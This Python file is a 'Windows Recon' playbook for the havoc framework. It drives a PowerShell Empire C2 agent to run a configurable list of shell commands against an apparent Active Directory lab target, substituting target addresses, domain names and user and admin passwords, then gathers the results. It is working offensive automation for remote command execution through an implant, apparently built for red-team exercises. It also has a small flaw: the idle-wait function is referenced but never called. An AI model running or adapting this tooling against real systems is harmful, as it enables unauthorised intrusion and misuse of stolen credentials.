# Import the supporting Python packages.
import re
import os
import string
import random
import pprint
import time as t
import argparse
from configparser import ConfigParser

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - Windows Recon')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/windows_recon/windows_recon.ini')

c2_task_name = config.get('c2_task', 'task_name')
c2_agent_name = config.get('c2_task', 'agent_name')
target_cidr = config.get('c2_task', 'cidr')
command_list = config.get('c2_task', 'command_list')
remote_ad_task_name = config.get('remote_ad_task', 'task_name')
ad_tld = config.get('remote_ad_task', 'ad_tld')
ad_domain = config.get('remote_ad_task', 'ad_domain')
ad_realm = config.get('remote_ad_task', 'ad_realm')
user_name = config.get('remote_ad_task', 'user_name')
user_password = config.get('remote_ad_task', 'user_password')
admin_password = config.get('remote_ad_task', 'admin_password')


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


# Verify c2_task exists
print(f'\nVerifying that powershell_empire task {c2_task_name} exists.')
c2_task = h.verify_task(c2_task_name, 'powershell_empire')
if c2_task:
    print(f'C2 task {c2_task_name} found.')
else:
    exit(f'No powershell_empire task with name {c2_task_name} found. Exiting...')

# Verify that the C2 agent exists.
print(f'\nVerifying that agent {c2_agent_name} exists.')
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
c2_instruct_command = 'get_agents'
c2_instruct_args = {'Name': c2_agent_name}
agents_list = h.interact_with_task(c2_task_name, c2_instruct_instance, c2_instruct_command, c2_instruct_args)
agent_exists = False
for agent in agents_list['agents']:
    if c2_agent_name == agent['name']:
        agent_exists = True
if agent_exists:
    print(f'Agent {c2_agent_name} exists. Continuing...\n')
else:
    exit(f'Agent {c2_agent_name} not found. Exiting...\n')

# Verify remote_ad_task_name exists
print(f'\nVerifying that trainman task {remote_ad_task_name} exists.')
target_ip = None
remote_ad_task = h.verify_task(remote_ad_task_name, 'trainman')
if remote_ad_task:
    print(f'Trainman task {remote_ad_task_name} found.')
    target_ip = get_task_target_ip(remote_ad_task_name)
else:
    exit(f'\nNo trainman task with name {remote_ad_task_name} found. Exiting...')

# Execute a list of shell commands on the agent.
for command in command_list.split(', '):
    if command == 'pause':
        # Wait for key press and then go to the next command
        input('Paused. Press Enter to continue...')
        command = 'whoami'
    # Replace variables in shell_command
    target_insert = re.sub('\$TARGET', target_ip, command)
    cidr_insert = re.sub('\$CIDR', target_cidr, target_insert)
    tld_insert = re.sub('\$AD_TLD', ad_tld, cidr_insert)
    domain_insert = re.sub('\$AD_DOMAIN', ad_domain, tld_insert)
    user_name_insert = re.sub('\$USER_NAME', user_name, domain_insert)
    user_password_insert = re.sub('\$USER_PASSWORD', user_password, user_name_insert)
    shell_command = re.sub('\$ADMIN_PASSWORD', admin_password, user_password_insert)
    print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
    # Use a random string for the agent instruct_instance of each shell command.
    sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
    instruct_command = 'agent_shell_command'
    instruct_args = {'Name': c2_agent_name, 'command': shell_command}
    command_response = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
    if command_response['outcome'] == 'success':
        print(f'{shell_command} succeeded.\n')
        command_task_id = command_response['message']['taskID']
    else:
        print(f'{instruct_command} failed.\n')
        command_task_id = None

    # Get the agent_shell_command results.
    if command_task_id:
        print(f'\nGetting results from agent_shell_command "{shell_command}"\n')
        results = None
        while not results:
            try:
                instruct_command = 'get_shell_command_results'
                instruct_args = {'Name': c2_agent_name}
                shell_results = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
                if shell_results['outcome'] == 'success':
                    for shell_result in shell_results['results']:
                        if shell_result['taskID'] == command_task_id:
                            results = shell_result['results']
                else:
                    results = f'{instruct_command} failed.\n'
                if not results:
                    t.sleep(10)
            except KeyboardInterrupt:
                exit('get_shell_command_results interrupted. Exiting...')
        print(f'\n{shell_command} results:\n')
        print(results)

    # Wait for the powershell_empire task to become idle.
    print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
    try:
        h.wait_for_idle_task
    except KeyboardInterrupt:
        exit('Interrupting wait_for_idle_task. Exiting...')
    print(f'\n{c2_task_name} is now idle.')
    t.sleep(random.randrange(20))

# Playbook is complete.
exit('\nPlaybook operation completed. Exiting...')
